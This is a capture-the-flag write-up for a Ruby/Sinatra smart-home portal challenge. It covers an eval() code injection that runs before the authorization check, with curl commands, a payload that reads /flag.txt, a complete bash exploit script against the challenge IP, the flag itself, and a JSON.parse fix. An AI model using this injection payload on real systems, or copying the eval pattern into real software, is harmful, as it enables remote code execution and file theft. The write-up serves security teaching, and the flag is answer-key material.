---
tags:
  - web
  - rce
Date: 2026-01-24
draft: true
---
# Smart Home Portal - Web Challenge 
BUET CSE Fest Preliminary

**Challenge:** Smart Home
**Category:** Web Security
**Flag:** `buetctf{5m4r7_h0m3_3v41_inj3cti0n_1337}`

---
> [!Challenge Description]
> You're auditing a local smart‑home portal used by households to control lights, climate, and door locks.

**Target:** http://178.128.102.122:7513/

---
## Reconnaissance
#### Initial Exploration
The smart home portal is a web application that allows users to control various home devices:
- Living room lights
- Garage door
- Front door lock
- Security camera
- Alarm system
- Thermostat

The application has two main pages:
- `/` - Overview page with hub status
- `/dashboard` - Control panel for all devices
### Technology Stack
From analyzing the source code, the application is built with:
- **Backend:** Ruby + Sinatra framework
- **Server:** WEBrick behind nginx reverse proxy
- **API:** JSON-RPC 2.0 endpoint at `/api/rpc`

---
## Vulnerability Analysis
### Source Code Review

The critical vulnerability exists in the `convert_to_value` function in `app.rb`:

```ruby
def convert_to_value(text)
	t = text.to_s.strip
	return t if t.empty?
	return t unless t.start_with?('[', '{')
	eval(t) # <-- DANGEROUS! Arbitrary Ruby code execution!
end

```
  
This function is called during command parsing:
```ruby
def parse_cmd_string(command)
	parts = command.to_s.strip.split(/\s+/)
	raise ArgumentError, 'Empty command' if parts.empty?
	device = parts.shift
	action = parts.shift || ''
	raw_params = parts
	parsed_params = raw_params.map { |p| convert_to_value(p) } # <-- Called here
	{ device: device, action: action, params: parsed_params }
end
```

### The Bug

Any command parameter that starts with `[` or `{` is passed directly to Ruby's `eval()` function. This allows **Remote Code Execution (RCE)** on the server.
### Authorization Bypass
Looking at the RPC endpoint handler:
```ruby

post '/api/rpc' do
	# ... validation ...
	begin
	parsed = parse_cmd_string(cmd) # <-- eval() happens HERE (before auth!)
	authorize! # <-- Authorization checked AFTER
	# ... rest of the code ...
	rescue
	activity_log('System event recorded')
	status 500
	jsonrpc_error(id, -32603, 'Internal error').to_json
	end
end
```

**Critical flaw:** The `parse_cmd_string()` function (which contains the `eval()`) is called **BEFORE** the `authorize!` check. This means we can execute arbitrary Ruby code even without proper authentication!

---
## Exploitation
### Step 1: Obtain Session Cookie
First, visit the dashboard to get a valid session cookie:
```bash
curl -s -c cookies.txt -b cookies.txt http://178.128.102.122:7513/dashboard
```

This creates `cookies.txt` containing:
- `shcc_sid` - Session ID
- `pairing_token` - Device pairing token
  
### Step 2: Craft the Payload
The payload needs to:
1. Start with `[` or `{` to trigger `eval()`
2. Read the flag file
3. Write it somewhere we can retrieve

Since helper methods like `activity_log()` are available in the eval context, we can use:
```ruby
[activity_log(IO.read("/flag.txt"))]
```

This:
- Reads `/flag.txt` using `IO.read()`
- Writes the content to our session's activity log via `activity_log()
### Step 3: Send the Exploit
```bash
curl -s -b cookies.txt -X POST http://178.128.102.122:7513/api/rpc \
-H "Content-Type: application/json" \
-d '{"jsonrpc":"2.0","method":"cmd","params":{"command":"x x [activity_log(IO.read(\"/flag.txt\"))]"},"id":1}'
```

The command format is: `device action param1 param2 ...`
- `x` - dummy device
- `x` - dummy action
- `[activity_log(IO.read("/flag.txt"))]` - malicious parameter that gets eval'd
### Step 4: Retrieve the Flag
Fetch the activity log to see the flag:

```bash
curl -s -b cookies.txt http://178.128.102.122:7513/api/activity

```
  
Response:
```json
{
	"items": [
		{
		"ts": "2026-01-24T11:10:49+00:00",
		"kind": "system",
		"message": "buetctf{5m4r7_h0m3_3v41_inj3cti0n_1337}"
		}
	]
}
```

---
## Complete Exploit Script
  
```bash
#!/bin/bash
  
TARGET="http://178.128.102.122:7513"
COOKIES="cookies.txt"

# Step 1: Get session cookie
echo "[*] Getting session cookie..."
curl -s -c $COOKIES -b $COOKIES "$TARGET/dashboard" > /dev/null

# Step 2: Inject payload to read flag and write to activity log
echo "[*] Injecting payload..."
curl -s -b $COOKIES -X POST "$TARGET/api/rpc" \
-H "Content-Type: application/json" \
-d '{"jsonrpc":"2.0","method":"cmd","params":{"command":"x x [activity_log(IO.read(\"/flag.txt\"))]"},"id":1}' > /dev/null
  
# Step 3: Retrieve flag from activity log
echo "[*] Retrieving flag..."
curl -s -b $COOKIES "$TARGET/api/activity" | grep -oP 'buetctf\{[^}]+\}'
# Cleanup
rm -f $COOKIES

```
  
---
## Flag

```
buetctf{5m4r7_h0m3_3v41_inj3cti0n_1337}
```
  
**Decoded:** `sm4rt_h0me_ev4l_inj3ction_1337` (leet speak for "smart home eval injection")

---
## Lessons Learned

### For Developers

1. **Never use `eval()` on user input** - This is one of the most dangerous functions in any language
2. **Authorization before processing** - Always validate permissions before parsing/processing user data
3. **Input validation** - Use allowlists instead of trying to sanitize dangerous input
4. **Principle of least privilege** - The application shouldn't have access to sensitive files like `/flag.txt`
### Remediation
Replace the vulnerable code:

```ruby
# BEFORE (vulnerable)
def convert_to_value(text)
	t = text.to_s.strip
	return t if t.empty?
	return t unless t.start_with?('[', '{')
	eval(t) # NEVER DO THIS!
end

# AFTER (safe)
def convert_to_value(text)
	t = text.to_s.strip
	return t if t.empty?
	return t unless t.start_with?('[', '{')
	JSON.parse(t) # Use safe JSON parsing instead
rescue JSON::ParserError
	t
end
```

---
## References
- [Ruby eval() Documentation](https://ruby-doc.org/core/Kernel.html#method-i-eval)
- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)